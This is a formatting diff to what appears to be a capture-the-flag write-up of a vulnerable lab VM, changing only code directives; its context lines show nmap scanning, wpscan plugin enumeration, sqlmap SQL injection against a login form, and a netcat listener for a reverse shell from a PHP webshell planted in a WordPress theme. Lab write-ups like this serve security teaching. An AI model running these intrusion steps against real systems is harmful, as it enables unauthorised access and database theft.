@@ -18,7 +18,7 @@ Go grab the image and follow along.
 
 First I need to determine the image's IP address and what services it is running:
 
-.. code-block:: console
+.. code:: console
 
 	root@kali:~# nmap -sn 192.168.56.0/24
 	
@@ -79,7 +79,7 @@ a bit easier.
 
 Using :code:`wpscan` I can find out which of the installed plugins have vulnerabilities.
 
-.. code-block:: console
+.. code:: console
 
 	root@kali:~# wpscan -u http://192.168.56.103:8080/wordpress --enumerate vp
 	_______________________________________________________________
@@ -207,7 +207,7 @@ I could just start attacking this with various SQLi strings, but the
 beauty of attacking a virtual machine is that I can use tools without the fear
 of breaking someone else's stuff. Roll out :code:`sqlmap` and let's see what we can find:
 
-.. code-block:: console
+.. code:: console
 
 	root@kali:~# sqlmap  -u "192.168.56.103/login.php" --data="user=1&password=1&s=Submit"
 	
@@ -237,7 +237,7 @@ First I'll get a list of databases on the system. This process takes a little wh
 so when it asks "*do you want sqlmap to try to optimize value(s) for DBMS delay 
 responses (option '--time-sec')? [Y/n]*" answer *YES*. It will be done quicker.
 
-.. code-block:: console
+.. code:: console
 
 	root@kali:~# sqlmap  -u "192.168.56.103/login.php" --data="user=1&password=1&s=Submit" --dbms=mysql --dbs
 	
@@ -273,7 +273,7 @@ interesting, so let's take a look at those later. Additionally, if I can get
 a login, especially an *admin* one, I could try to exploit the plugins later on.
 After all, it does say there are multiple ways into this VM.
 
-.. code-block:: console
+.. code:: console
 
 	root@kali:~# sqlmap  -u "192.168.56.103/login.php" --data="user=1&password=1&s=Submit" --dbms=mysql --tables -D wordpress8080
 	
@@ -309,7 +309,7 @@ To do that I need to edit the theme in the admin section, and just
 paste in the contents. The I need to open a listening :code:`netcat` session and
 browse to a non-existant page on the site.
 
-.. code-block:: console
+.. code:: console
 
 	root@kali:/usr/share/webshells/php# nc -lvnp 1337
 	listening on [any] 1337 ...
